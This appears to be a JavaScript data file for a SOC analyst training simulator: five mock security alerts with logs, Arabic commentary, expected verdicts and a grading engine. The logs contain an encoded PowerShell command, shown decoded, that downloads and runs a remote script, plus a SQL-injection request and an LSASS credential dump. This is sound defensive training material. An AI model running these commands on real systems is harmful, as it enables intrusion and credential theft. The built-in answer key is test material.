// Live SOC War Room & SIEM Simulator Alert Queue Data
// Curated for Eng. Bashar Hafedh

const warRoomAlerts = [
  {
    id: "SEC-ALERT-8901",
    timestamp: "2026-11-06 08:14:22 UTC",
    severity: "CRITICAL",
    ruleName: "Sysmon 10: Potential Mimikatz LSASS Memory Dump",
    mitreTactic: "Credential Access",
    mitreId: "T1003.001",
    mitreTechnique: "OS Credential Dumping: LSASS Memory",
    host: "FIN-SRV-04.corp.local",
    user: "CORP\\j.smith",
    srcIp: "10.140.20.45",
    destIp: "127.0.0.1",
    ioc: "185.220.101.5",
    iocType: "ip",
    iocHash: "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92",
    status: "Open", // 'Open', 'In Progress', 'Resolved'
    rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>Information</Level>
    <TimeCreated SystemTime="2026-11-06T08:14:22.1092810Z" />
    <Computer>FIN-SRV-04.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1003.001,technique_name=LSASS Access</Data>
    <Data Name="UtcTime">2026-11-06 08:14:22.109</Data>
    <Data Name="SourceProcessGuid">{A2B1C3D4-0000-0000-A1B2-C3D4E5F60000}</Data>
    <Data Name="SourceProcessId">4812</Data>
    <Data Name="SourceImage">C:\\Users\\Public\\Downloads\\procdump64.exe</Data>
    <Data Name="TargetProcessGuid">{A2B1C3D4-0000-0000-0000-0000000002A4}</Data>
    <Data Name="TargetProcessId">676</Data>
    <Data Name="TargetImage">C:\\Windows\\system32\\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1FFFFF</Data>
    <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9fb24|C:\\Windows\\System32\\KERNELBASE.dll+2c34e|UNKNOWN(00007FF7291B1204)</Data>
  </EventData>
</Event>`,
    context: "تم تنزيل الأداة procdump64.exe في المجلد المشبوه C:\\Users\\Public وحاولت تفريغ ذاكرة lsass.exe بصلاحية كاملة (GrantedAccess=0x1FFFFF) مباشرة بعد اتصال خارجي بالـ IP 185.220.101.5.",
    tiResult: {
      reputation: "MALICIOUS",
      confidence: 98,
      country: "Russian Federation",
      isp: "TOR Exit Node / Bulletproof Hosting",
      vtDetections: "61/72 Engines (Cobalt Strike C2 / Tor Exit)"
    },
    expectedVerdict: "TP", // True Positive
    verdictExplanation: "هذا هجوم حقيقي حرج جداً (True Positive)! استخدام procdump من مجلد Public لتفريغ LSASS بصلاحية 0x1FFFFF هو تكنيك معروف لسرقة كلمات المرور والهاشات (Credential Dumping) بعد اختراق الجهاز."
  },

  {
    id: "SEC-ALERT-8902",
    timestamp: "2026-11-06 08:32:05 UTC",
    severity: "HIGH",
    ruleName: "EDR / Sysmon 1: Encoded PowerShell Command Execution",
    mitreTactic: "Execution",
    mitreId: "T1059.001",
    mitreTechnique: "Command and Scripting Interpreter: PowerShell",
    host: "HR-PC-12.corp.local",
    user: "CORP\\sarah.connor",
    srcIp: "10.140.30.12",
    destIp: "194.26.29.112",
    ioc: "update-security-patch.xyz",
    iocType: "domain",
    iocHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    status: "Open",
    rawLog: `EventCode=1 (Sysmon Process Creation)
UtcTime: 2026-11-06 08:32:05.412
ProcessId: 7892
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: "powershell.exe" -nop -w hidden -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAGUAYwB1AHIAaQB0AHkALQBwAGEAdABjAGgALgB4AHkAegAvAHAALnAAcwAxACcAKQA=
ParentProcessId: 4120
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" "C:\\Users\\sarah.connor\\Downloads\\Resume_Invoice_302.docm"
Hashes: SHA256=9A2B4C8F6E...`,
    context: "برنامج Microsoft Word قام بتشغيل PowerShell بأمر مشفر عبر Base64 ومخفي (-w hidden). عند فك التشفير يظهر: iex (New-Object Net.WebClient).DownloadString('http://update-security-patch.xyz/p.ps1').",
    tiResult: {
      reputation: "MALICIOUS",
      confidence: 95,
      country: "Seychelles",
      isp: "Malicious Phishing Infrastructure",
      vtDetections: "54/70 Engines (IcedID / Emotet Loader)"
    },
    expectedVerdict: "TP",
    verdictExplanation: "هجوم حقيقي ومؤكد (True Positive): ماكرو خبيث داخل مستند وورد (Macro Malicious Document) قام باستدعاء PowerShell لتنزيل بايلود خبيث من دومين احتيالي."
  },

  {
    id: "SEC-ALERT-8903",
    timestamp: "2026-11-06 09:05:11 UTC",
    severity: "LOW",
    ruleName: "Firewall: Port Scan Detected from Monitoring Server",
    mitreTactic: "Reconnaissance",
    mitreId: "T1046",
    mitreTechnique: "Network Service Discovery",
    host: "NET-NMS-01.corp.local",
    user: "SYSTEM",
    srcIp: "10.140.1.50",
    destIp: "10.140.0.0/16",
    ioc: "10.140.1.50",
    iocType: "ip",
    iocHash: "N/A",
    status: "Open",
    rawLog: `TIMESTAMP: 2026-11-06 09:05:11
DEVICE: Palo Alto NGFW (Zone: Internal-Trust)
RULE_HIT: Alert-Port-Scan-Sweep
SRC_IP: 10.140.1.50 (Asset: Zabbix-SNMP-Monitor)
DST_PORTS: 161 (SNMP), 10050 (Zabbix), 443 (HTTPS)
PACKET_COUNT: 4,800 packets in 60 seconds
ACTION: Logged`,
    context: "خادم المراقبة الداخلي Zabbix المسجل رسمياً في CMDB قام بفحص دوري للأجهزة للتأكد من حالة السيرفرات والأجهزة عبر SNMP و Zabbix Agent.",
    tiResult: {
      reputation: "CLEAN / BENIGN",
      confidence: 0,
      country: "Internal LAN RFC1918",
      isp: "Corporate Internal Network",
      vtDetections: "0/72 Engines (Whitelisted Enterprise Asset)"
    },
    expectedVerdict: "FP", // False Positive
    verdictExplanation: "إنذار خاطئ مشروع (False Positive): السيرفر 10.140.1.50 هو جهاز مراقبة الشبكة الرسمي للشركة، والفحص مجدول كل 60 دقيقة عبر بروتوكولات المراقبة الرسمية."
  },

  {
    id: "SEC-ALERT-8904",
    timestamp: "2026-11-06 09:44:30 UTC",
    severity: "HIGH",
    ruleName: "Windows Security 4625: Potential Password Spraying Attack",
    mitreTactic: "Credential Access",
    mitreId: "T1110.003",
    mitreTechnique: "Brute Force: Password Spraying",
    host: "DC01.corp.local",
    user: "Multiple Accounts (50+ Users)",
    srcIp: "10.140.50.88",
    destIp: "10.140.10.5 (Domain Controller)",
    ioc: "10.140.50.88",
    iocType: "ip",
    iocHash: "N/A",
    status: "Open",
    rawLog: `EventCode=4625 (Logon Failure)
TargetUserName=admin, a.hassan, m.khalil, b.hafedh, s.ali, f.omar (52 distinct users)
WorkstationName=WKSTN-DEV-33
FailureReason=%%2313 (Unknown user name or bad password)
SubStatus=0xC000006A (Bad Password)
LogonType=3 (Network Logon over SMB/Kerberos)
Frequency: 1 failure per user over 15 minutes window`,
    context: "جهاز WKSTN-DEV-33 يحاول تجربة كلمة مرور واحدة (Winter2026!) ضد 52 حساب مختلف في الدليل النشط بفاصل زمني لتفادي قفل الحسابات (Account Lockout Threshold).",
    tiResult: {
      reputation: "SUSPICIOUS",
      confidence: 85,
      country: "Internal LAN",
      isp: "Corporate Workstation Subnet",
      vtDetections: "Internal compromised asset performing internal recon"
    },
    expectedVerdict: "TP",
    verdictExplanation: "هجوم حقيقي مؤكد (True Positive): هذا نمط كلاسيكي لهجوم رش كلمات المرور (Password Spraying). المهاجم جرب كلمة مرور شائعة ضد عشرات الحسابات لتجنب Lockout."
  },

  {
    id: "SEC-ALERT-8905",
    timestamp: "2026-11-06 10:12:00 UTC",
    severity: "MEDIUM",
    ruleName: "Web Application: Multiple SQLi Injection Signatures in URI",
    mitreTactic: "Initial Access",
    mitreId: "T1190",
    mitreTechnique: "Exploit Public-Facing Application",
    host: "WEB-PROD-01.corp.local",
    user: "Anonymous (Web Visitor)",
    srcIp: "45.154.255.89",
    destIp: "198.51.100.25 (Port 443)",
    ioc: "45.154.255.89",
    iocType: "ip",
    iocHash: "N/A",
    status: "Open",
    rawLog: `2026-11-06 10:11:59 [error] 1421#0: *84501 access forbidden by rule,
client: 45.154.255.89, server: portal.corp.com,
request: "GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
host: "portal.corp.com", referrer: "-",
status: 403, bytes_sent: 162`,
    context: "محاولات حقن SQL Injection عبر مسار products.php، وقام جدار حماية تطبيقات الويب (WAF) بحظر الطلب وإرجاع رمز الخطأ 403 Forbidden.",
    tiResult: {
      reputation: "MALICIOUS",
      confidence: 90,
      country: "Netherlands",
      isp: "Hosting Solutions Ltd (Scanner Bot)",
      vtDetections: "38/72 Engines (Web Scanner / Vulnerability Prober)"
    },
    expectedVerdict: "BTP", // Benign True Positive or Blocked True Positive
    verdictExplanation: "هجوم حقيقي ولكنه محظور بنجاح (Benign True Positive / Blocked True Positive): الهجوم حقيقي ومصدره IP خبيث، ولكن الـ WAF قام بصده وأرجع كود 403 ولم تخترق قاعدة البيانات."
  }
];

class WarRoomEngine {
  constructor() {
    this.alerts = JSON.parse(JSON.stringify(warRoomAlerts));
    this.currentAlertId = this.alerts[0].id;
    this.resolvedCount = 0;
  }

  getAlert(id) {
    return this.alerts.find(a => a.id === id);
  }

  getCurrentAlert() {
    return this.getAlert(this.currentAlertId) || this.alerts[0];
  }

  selectAlert(id) {
    this.currentAlertId = id;
  }

  submitInvestigation(alertId, verdict, notes, escalation) {
    const alert = this.getAlert(alertId);
    if (!alert) return null;

    alert.status = "Resolved";
    alert.analystVerdict = verdict;
    alert.analystNotes = notes;
    alert.escalation = escalation;
    this.resolvedCount++;

    const isMatch = (verdict === alert.expectedVerdict) || 
                    (verdict === 'TP' && alert.expectedVerdict === 'BTP');

    return {
      success: true,
      isCorrect: isMatch,
      expected: alert.expectedVerdict,
      explanation: alert.verdictExplanation
    };
  }
}

const warRoomEngine = new WarRoomEngine();
